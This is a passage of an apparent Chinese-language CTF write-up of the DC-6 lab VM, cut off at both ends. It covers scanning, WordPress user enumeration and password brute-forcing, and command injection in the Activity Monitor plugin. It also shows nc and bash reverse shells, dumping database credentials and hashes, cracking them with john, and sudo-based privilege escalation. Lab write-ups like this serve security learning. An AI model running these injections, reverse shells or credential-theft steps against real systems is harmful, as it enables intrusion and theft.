class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.161</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-11 10:35 EDT<br>Nmap scan report for 192.168.135.161<br>Host is up (0.00063s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)<br>|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)<br>|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-server-header: Apache/2.4.25 (Debian)<br>|_http-title: Did not follow redirect to http://wordy/<br>MAC Address: 00:0C:29:A3:6E:B2 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.25 ((Debian))</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p><p><strong>80端口</strong></p><blockquote><p>NOTE: You WILL need to edit your hosts file on your pentesting device so that it reads something like:</p><p>192.168.0.142 wordy</p><p>NOTE: I’ve used 192.168.0.142 as an example. You’ll need to use your normal method to determine the IP address of the VM, and adapt accordingly.</p><p>This is VERY important.</p></blockquote><p>访问 <code>http://192.168.135.161</code> ，发现无法访问且重定向到了 <code>http://wordy/</code> ，这样的话我们添加一条映射：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo mousepad /etc/hosts</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br>192.168.135.161 wordy<br><br></code></pre></td></tr></table></figure><p>这样就可以正常访问了。</p><p>进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://wordy</span>                                                    <br><br>---- Scanning URL: http://wordy/ ----<br>+ http://wordy/index.php (CODE:301|SIZE:0)<br>+ http://wordy/server-status (CODE:403|SIZE:293)<br>==&gt; DIRECTORY: http://wordy/wp-admin/<br>==&gt; DIRECTORY: http://wordy/wp-content/<br>==&gt; DIRECTORY: http://wordy/wp-includes/<br>+ http://wordy/xmlrpc.php (CODE:405|SIZE:42)<br></code></pre></td></tr></table></figure><p>发现是个 WordPress 站点，使用 wpscan 枚举：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://wordy --enumerate u</span><br><br>[+] URL: http://wordy/ [192.168.135.161]<br><br>[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;<br> |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>题目作者给的提示：</p><blockquote><p>CLUE</p><p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p><p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt </p><p>That should save you a few years. ;-)</p></blockquote><p>创建字典进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin\njens\ngraham\nmark\nsarah&quot;</span> &gt; user.txt</span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>  <br>admin<br>jens<br>graham<br>mark<br>sarah<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://wordy -U user.txt -P passwords.txt</span><br><br>[+] Performing password attack on Xmlrpc against 5 user/s<br>[SUCCESS] - mark / helpdesk01                                                                                                              <br>Trying sarah / !lak019b Time: 00:03:23 &lt;=================================================           &gt; (12547 / 15215) 82.46%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01<br></code></pre></td></tr></table></figure><p>访问 <code>http://wordy/wp-admin</code> ，重定向到后台登录页 <code>http://wordy/wp-login.php</code> ，进行登录</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>在 <code>activity_monitor</code> ===&gt; <code>tools</code> 下，发现有个解析 IP 地址为主机名的查找功能，这个功能可以实现远程命令执行</p><p>burp 抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>wordy<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------231067001935986298275393280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>30<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://wordy<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>wordpress_14014489b649086e51cacb340bafe656=mark%7C1657762666%7CV5tY1Gig7Y3BLyLMi2N8APVpcQNksGkYUCeB7mpv33l%7C4eae77eb132fc3228c3b189f7fac3315ddfb2ed11d1c46392067d0553d01d545; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_14014489b649086e51cacb340bafe656=mark%7C1657762666%7CV5tY1Gig7Y3BLyLMi2N8APVpcQNksGkYUCeB7mpv33l%7C74082dfc18805151b1531c3cd705624ccf2179b8b53e32317faf53e3276321cc; wp-settings-time-3=1657589884; wp-settings-3=mfold%3Do<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280</span></span><br><span class="applescript">Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;ip&quot;</span></span><br><span class="applescript"></span><br><span class="applescript"><span class="hljs-number">192.168</span><span class="hljs-number">.135</span><span class="hljs-number">.141</span></span><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280</span></span><br><span class="applescript">Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;lookup&quot;</span></span><br><span class="applescript"></span><br><span class="applescript">Lookup</span><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280--</span></span><br></code></pre></td></tr></table></figure><p>改包：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.135.141</span>;whoami<br></code></pre></td></tr></table></figure><p>放包，成功实现命令执行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2022</span>-<span class="hljs-number">07</span>-<span class="hljs-number">12</span> <span class="hljs-number">01</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span><br><br><span class="hljs-attribute">The</span> IP address <span class="hljs-number">192.168.135.141</span>;whoami resolves to .<br><br><span class="hljs-attribute">Output</span> from dig:<br><br><span class="hljs-attribute">www</span>-data<br></code></pre></td></tr></table></figure><p>反弹 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash, fail</span><br>192.168.135.141;bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1<br><span class="hljs-meta">#</span><span class="bash"> nc, success</span><br>192.168.135.141;nc -e /bin/bash 192.168.135.141 4444<br></code></pre></td></tr></table></figure><p>kali 监听，成功得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                         <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.161] 48976<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-6:/var/www/html/wp-admin$<br></code></pre></td></tr></table></figure><p>也可以直接查找利用脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit wordpress activity monitor</span>                 <br>----------------------------------------------------------------------------------------------------------<br>Exploit Title                                                                                            |  Path<br>----------------------------------------------------------------------------------------------------------<br>WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                 | php/webapps/45274.html<br>WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)   | php/webapps/50110.py<br>----------------------------------------------------------------------------------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查找 SUID：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html/wp-admin$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/ping<br></code></pre></td></tr></table></figure><p>查看配置文件，得到数据库账号密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html/wp-admin$ cd ..<br>cd ..<br>www-data@dc-6:/var/www/html$ ls<br>ls<br>index.php        wp-blog-header.php    wp-cron.php        wp-mail.php<br>license.txt      wp-comments-post.php  wp-includes        wp-settings.php<br>readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php<br>wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php<br>wp-admin         wp-content            wp-login.php       xmlrpc.php<br>www-data@dc-6:/var/www/html$ cat wp-config.php<br>cat wp-config.php<br><br>// ** MySQL settings - You can get this info from your web host ** //<br>/** The name of the database for WordPress */<br><br>define(&#x27;WP_HOME&#x27;,&#x27;http://wordy&#x27;);<br>define(&#x27;WP_SITEURL&#x27;,&#x27;http://wordy&#x27;);<br><br>define( &#x27;DB_NAME&#x27;, &#x27;wordpressdb&#x27; );<br><br>/** MySQL database username */<br>define( &#x27;DB_USER&#x27;, &#x27;wpdbuser&#x27; );<br><br>/** MySQL database password */<br>define( &#x27;DB_PASSWORD&#x27;, &#x27;meErKatZ&#x27; );<br><br>/** MySQL hostname */<br>define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );<br><br>/** Database Charset to use in creating database tables. */<br>define( &#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27; );<br><br>/** The Database Collate type. Don&#x27;t change this if in doubt. */<br>define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );<br></code></pre></td></tr></table></figure><p>登录数据库，得到用户密码盐值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html$ mysql -uwpdbuser -pmeErKatZ<br>mysql -uwpdbuser -pmeErKatZ<br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection id is 92559<br>Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| wordpressdb        |<br>+--------------------+<br>2 rows in set (0.05 sec)<br><br>MariaDB [(none)]&gt; use wordpressdb;<br>use wordpressdb;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [wordpressdb]&gt; show tables;<br>show tables;<br>+-----------------------+<br>| Tables_in_wordpressdb |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_pv_am_activities   |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>13 rows in set (0.00 sec)<br><br>MariaDB [wordpressdb]&gt; select ID,user_login,user_pass,user_nicename from wp_users;<br>&lt;ct ID,user_login,user_pass,user_nicename,user_activation_key from wp_users; <br>+----+------------+------------------------------------+---------------+<br>| ID | user_login | user_pass                          | user_nicename |<br>+----+------------+------------------------------------+---------------+<br>|  1 | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         |<br>|  2 | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        |<br>|  3 | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          |<br>|  4 | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/ | sarah         |<br>|  5 | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          |<br>+----+------------+------------------------------------+---------------+<br>5 rows in set (0.00 sec)<br><br>MariaDB [wordpressdb]&gt; <br></code></pre></td></tr></table></figure><p>john 破解：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat passwd.txt</span>                                                   <br>admin:$P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1<br>graham:$P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41<br>mark:$P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/<br>sarah:$P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/<br>jens:$P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt</span><br>Using default input encoding: UTF-8<br>Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>helpdesk01       (mark)<br>1g 0:01:36:26 DONE (2022-07-11 23:59) 0.000172g/s 2478p/s 11232c/s 11232C/s  joefeher..*7¡Vamos!<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><p>未爆破出其他用户，且 mark 用户的密码也不能 SSH 登录</p><p>在用户目录下查找信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html$ ls /home<br>ls /home<br>graham  jens  mark  sarah<br>www-data@dc-6:/var/www/html$ cd /home<br>cd /home<br>www-data@dc-6:/home$ ls<br>ls<br>graham  jens  mark  sarah<br>www-data@dc-6:/home$ ls graham<br>ls graham<br>www-data@dc-6:/home$ ls jens<br>ls jens<br>backups.sh<br>www-data@dc-6:/home$ cat jens/backups.sh<br>cat jens/backups.sh<br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br>www-data@dc-6:/home$ ls mark<br>ls mark<br>stuff<br>www-data@dc-6:/home$ ls -l mark<br>ls -l mark<br>total 4<br>drwxr-xr-x 2 mark mark 4096 Apr 26  2019 stuff<br>www-data@dc-6:/home$ ls -l mark/stuff<br>ls -l mark/stuff<br>total 4<br>-rw-r--r-- 1 mark mark 241 Apr 26  2019 things-to-do.txt<br>www-data@dc-6:/home$ cat mark/stuff/things-to-do.txt<br>cat mark/stuff/things-to-do.txt<br>Things to do:<br><br>- Restore full functionality for the hyperdrive (need to speak to Jens)<br>- Buy present for Sarah&#x27;s farewell party<br>- Add new user: graham - GSo7isUM1D4 - done<br>- Apply for the OSCP course<br>- Buy new laptop for Sarah&#x27;s replacement<br>www-data@dc-6:/home$ ls /sarah<br>ls /sarah<br>ls: cannot access &#x27;/sarah&#x27;: No such file or directory<br>www-data@dc-6:/home$ ls sarah<br>ls sarah<br>www-data@dc-6:/home$ <br></code></pre></td></tr></table></figure><p>在 Mark 用户目录下找到了用户 graham 的密码，SSH 登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh graham@192.168.135.161</span>                      <br>graham@192.168.135.161&#x27;s password: <br>Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>graham@dc-6:~$ <br></code></pre></td></tr></table></figure><p>查看 sudo ，发现可以无密码以 jens 用户权限执行一个文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh<br></code></pre></td></tr></table></figure><p>查看是否具有写权限，发现 jens 和 graham 同属于 devs 组，而改组具有文件的写权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:/home/jens$ ls -l<br>total 4<br>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh<br>graham@dc-6:/home/jens$ id<br>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)<br>graham@dc-6:/home/jens$ cat /etc/group<br>[......]<br>graham:x:1001:<br>mark:x:1002:<br>sarah:x:1003:<br>jens:x:1004:<br>devs:x:1005:jens,graham<br></code></pre></td></tr></table></figure><p>写入调用 bash 的命令，执行得到 jens 用户权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 